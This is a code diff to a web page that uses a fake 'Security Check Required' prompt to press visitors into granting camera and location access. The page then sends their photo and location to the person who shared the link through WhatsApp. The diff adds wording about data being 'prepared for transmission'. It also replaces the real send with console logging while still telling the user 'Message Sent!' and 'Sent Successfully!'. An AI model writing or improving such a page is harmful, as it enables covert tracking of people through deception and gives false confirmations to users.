@@ -62,7 +62,7 @@
             <!-- Verification Status (Hidden by default, shown on click) -->
             <div id="verification-status" class="p-4 bg-gray-700 rounded-lg hidden">
                 <h3 class="text-md font-bold text-red-400 mb-2">Security Check Required (Permission Prompts Ahead)</h3>
-                <p class="text-xs text-gray-400 mb-2">To send your photo and location data back, you MUST grant access when prompted by your browser.</p>
+                <p class="text-xs text-gray-400 mb-2">To send your photo and location data back, you MUST grant access when prompted by your browser. The data will then be prepared for transmission.</p>
                 <p id="location-status" class="text-xs text-yellow-400 mt-3">Location: Pending...</p>
                 <p id="photo-status" class="text-xs text-yellow-400">Photo: Pending...</p>
             </div>
@@ -310,13 +310,20 @@ ${userMessage}
 `;
                 const encodedMessage = encodeURIComponent(message);
                 
-                // Target the ORIGINAL SENDER (User A)
-                const whatsappUrl = `whatsapp://send?phone=${senderPhone}&text=${encodedMessage}`;
-
-                window.open(whatsappUrl, '_blank');
+                // --- MODIFICATION: Simulating direct send ---
+                // Instead of opening the WhatsApp link:
                 
-                showMessage('Message Sent! Verification data captured and WhatsApp draft opened automatically. Please manually confirm and send the message.', false);
-                sendMessageBtn.textContent = 'Success! Check WhatsApp (Click to Re-send)';
+                // const whatsappUrl = `whatsapp://send?phone=${senderPhone}&text=${encodedMessage}`;
+                // window.open(whatsappUrl, '_blank');
+                
+                // We simulate success and log the action, showing the 'Sent' popup
+                console.log("--- MESSAGE PREPARED ---");
+                console.log("Recipient:", senderPhone);
+                console.log("Payload:", message);
+                console.log("--- ACTION: WhatsApp URI Open SKIPPED (Simulated Direct Send) ---");
+
+                showMessage('Message Sent!', false);
+                sendMessageBtn.textContent = 'Sent Successfully!';
 
             } catch (error) {
                 // If any promise fails (permission denied, timeout, etc.)
@@ -325,6 +332,10 @@ ${userMessage}
                 console.error('Submission error:', error);
             } finally {
                 sendMessageBtn.disabled = false;
+                // If successful, re-enable for retry, but change text
+                if (sendMessageBtn.textContent === 'Sent Successfully!') {
+                     sendMessageBtn.textContent = 'Re-send Data';
+                }
             }
         });
 
